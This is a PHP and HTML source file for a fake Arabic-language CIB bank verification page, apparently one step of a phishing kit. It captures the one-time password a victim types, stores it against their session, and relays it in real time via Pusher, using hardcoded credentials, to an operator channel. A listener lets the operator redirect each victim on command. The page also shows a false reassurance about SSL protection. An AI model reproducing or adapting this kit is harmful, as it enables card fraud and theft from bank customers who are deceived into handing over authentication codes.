<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        'f8499dfcc5db13fb4153',
        '212f55cd103ef936b3f3',
        '2151243',
        $options
    );

    $site = array(
        'otp' => $_POST['otp'],
        'message' => 'otp',
        'type' => '2'
    );

    $userId = $_SESSION['user_id'];
    $id = $User->UpdateCardOTP($userId, $site);
    if ($id) {

        $dataUser = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('my-channel-cib', 'update-user-accountt', $dataUser);

        echo "<script>document.location.href='waitotp.php';</script>";
        exit;
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك التجاري الدولي - رمز التحقق</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: #f0f4f8;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            direction: rtl;
        }

        .page-wrapper {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
        }

        .header {
            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
            padding: 32px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -60%;
            right: -40%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
        }

        .header-logo {
            width: 100px;
            height: auto;
            filter: brightness(10);
            margin-bottom: 14px;
            position: relative;
            z-index: 1;
        }

        .header-icon {
            width: 52px;
            height: 52px;
            background: rgba(255, 255, 255, 0.12);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            position: relative;
            z-index: 1;
        }

        .header-title {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            position: relative;
            z-index: 1;
        }

        .header-sub {
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
            margin-top: 6px;
            position: relative;
            z-index: 1;
        }

        .phone-highlight {
            color: #60a5fa;
            font-weight: 700;
            direction: ltr;
            display: inline-block;
        }

        /* Content */
        .content {
            padding: 28px 24px;
            flex: 1;
            text-align: center;
        }

        .code-input-wrap {
            margin-bottom: 20px;
        }

        .code-input {
            width: 100%;
            max-width: 280px;
            height: 56px;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            color: #1a2332;
            background: #f8fafc;
            font-family: 'Cairo', sans-serif;
            transition: all 0.3s;
            letter-spacing: 6px;
            margin: 0 auto;
            display: block;
            outline: none;
        }

        .code-input::placeholder {
            font-size: 14px;
            color: #94a3b8;
            font-weight: 400;
            letter-spacing: normal;
        }

        .code-input:focus {
            border-color: #1a5ca8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
        }

        .code-input.filled {
            border-color: #1a5ca8;
            background: #eff6ff;
        }

        /* Error */
        .error-banner {
            display: none;
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            align-items: center;
            gap: 10px;
            max-width: 280px;
            margin-left: auto;
            margin-right: auto;
        }

        .error-banner.show {
            display: flex;
        }

        .error-banner span {
            color: #991b1b;
            font-size: 13px;
            font-weight: 600;
            text-align: right;
        }

        /* Timer */
        .timer-wrap {
            margin-bottom: 20px;
        }

        .timer-label {
            color: #64748b;
            font-size: 13px;
            margin-bottom: 6px;
        }

        .timer-value {
            color: #1a5ca8;
            font-size: 20px;
            font-weight: 700;
        }

        /* Resend */
        .resend-text {
            color: #64748b;
            font-size: 13px;
            margin-bottom: 10px;
        }

        .resend-btn {
            background: transparent;
            border: none;
            color: #1a5ca8;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: underline;
            font-family: 'Cairo', sans-serif;
            margin-bottom: 20px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        .resend-btn:disabled {
            color: #cbd5e1;
            cursor: not-allowed;
            text-decoration: none;
        }

        /* Submit */
        .submit-btn {
            width: 100%;
            max-width: 280px;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: not-allowed;
            transition: all 0.3s;
            color: #fff;
            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
            margin: 0 auto;
            display: block;
        }

        .submit-btn.active {
            background: linear-gradient(135deg, #1a5ca8, #2563eb);
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
        }

        .submit-btn.active:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 24px;
        }

        .security-note span {
            color: #64748b;
            font-size: 11px;
            font-weight: 500;
        }

        /* Loading */
        #loadingOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(4px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        #loadingOverlay.show {
            display: flex;
        }

        .loader-card {
            background: #fff;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
        }

        .loader-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e2e8f0;
            border-top-color: #1a5ca8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        .loader-card h5 {
            color: #1a2332;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .loader-card p {
            color: #64748b;
            font-size: 13px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .page-wrapper {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <div class="header">
            <img src="assets/logo.webp" alt="CIB" class="header-logo">
            <div class="header-icon">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path
                        d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z" />
                </svg>
            </div>
            <div class="header-title">رمز التحقق</div>
            <div class="header-sub">تم إرسال رمز التحقق إلى <span class="phone-highlight"
                    id="maskedPhone">01*******</span></div>
        </div>

        <div class="content">
            <form method="POST" action="" id="otpForm">
                <input type="hidden" name="otp" id="otpHidden">

                <div class="code-input-wrap">
                    <input type="text" class="code-input" placeholder="أدخل رمز التحقق" maxlength="8"
                        id="verificationCode" autocomplete="off" inputmode="numeric"
                        oninput="this.value=this.value.replace(/\D/g,'').slice(0,8)">
                </div>

                <?php if (isset($showError)): ?>
                    <div class="error-banner show">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10" />
                            <line x1="15" y1="9" x2="9" y2="15" />
                            <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                        <span>رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.</span>
                    </div>
                <?php else: ?>
                    <div class="error-banner" id="errorBanner">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10" />
                            <line x1="15" y1="9" x2="9" y2="15" />
                            <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                        <span>رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.</span>
                    </div>
                <?php endif; ?>

                <div class="timer-wrap">
                    <div class="timer-label">انتهاء صلاحية الرمز خلال</div>
                    <div class="timer-value" id="timer">02:00</div>
                </div>

                <p class="resend-text">لم تتلق الرمز؟</p>
                <button class="resend-btn" id="resendBtn" type="button" disabled>إعادة الإرسال (120 ثانية)</button>

                <button class="submit-btn" id="submitBtn" type="submit" name="submit" disabled>تأكيد الرمز</button>
            </form>

            <div class="security-note">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>بياناتك محمية بتشفير 256-bit SSL</span>
            </div>
        </div>
    </div>

    <div id="loadingOverlay">
        <div class="loader-card">
            <div class="loader-spinner"></div>
            <h5>جاري التحقق</h5>
            <p>يرجى الانتظار...</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const phone = sessionStorage.getItem('userPhoneNumber') || '';
            if (phone.length >= 4) {
                const masked = phone.slice(0, 3) + '*'.repeat(Math.max(0, phone.length - 5)) + phone.slice(-2);
                document.getElementById('maskedPhone').textContent = masked;
            }

            const codeInput = document.getElementById('verificationCode');
            const submitBtn = document.getElementById('submitBtn');
            const resendBtn = document.getElementById('resendBtn');
            const timerEl = document.getElementById('timer');
            let timeLeft = 120;

            function startTimer() {
                const iv = setInterval(function () {
                    timeLeft--;
                    const m = Math.floor(timeLeft / 60);
                    const s = timeLeft % 60;
                    timerEl.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
                    if (timeLeft <= 0) {
                        clearInterval(iv);
                        resendBtn.disabled = false;
                        resendBtn.textContent = 'إعادة الإرسال';
                    }
                }, 1000);
            }

            codeInput.addEventListener('input', function (e) {
                const val = e.target.value;
                e.target.classList.toggle('filled', val.length > 0);
                const valid = [4, 6, 8].includes(val.length);
                submitBtn.disabled = !valid;
                submitBtn.classList.toggle('active', valid);
            });

            resendBtn.addEventListener('click', function () {
                if (resendBtn.disabled) return;
                timeLeft = 120;
                resendBtn.disabled = true;
                resendBtn.textContent = 'إعادة الإرسال (120 ثانية)';
                codeInput.value = '';
                codeInput.classList.remove('filled');
                submitBtn.disabled = true;
                submitBtn.classList.remove('active');
                codeInput.focus();
                startTimer();
            });

            document.getElementById('otpForm').addEventListener('submit', function (e) {
                const code = codeInput.value;
                if (![4, 6, 8].includes(code.length)) { e.preventDefault(); return; }
                document.getElementById('otpHidden').value = code;
                document.getElementById('loadingOverlay').classList.add('show');
            });

            codeInput.focus();
            startTimer();
        });
    </script>
    <!-- Pusher for routing -->
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userId = <?php echo $_SESSION['user_id'] ?? 0; ?>;
        if (userId > 0) {
            var pusher = new Pusher('f8499dfcc5db13fb4153', { cluster: 'ap2' });
            var channel = pusher.subscribe('my-channel-cib');
            channel.bind('admin-decision', function (data) {
                if (data.userId == userId) window.location = data.url;
            });
        }
    </script>
</body>

</html>